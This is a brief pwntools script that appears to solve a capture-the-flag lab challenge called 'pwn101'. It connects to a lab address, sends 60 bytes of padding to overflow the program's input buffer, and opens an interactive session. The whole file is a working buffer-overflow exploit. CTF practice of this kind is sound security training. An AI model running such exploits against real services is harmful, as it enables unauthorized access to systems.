from pwn import *

DEBUG = 1
if DEBUG == 0 :
    p = process("./pwn101")

else:
    p = remote("10.10.91.44", 9001)


p.recvline(b"Type the required ingredients to make briyani:")      
p.sendline(b"a"*60)
p.interactive()  
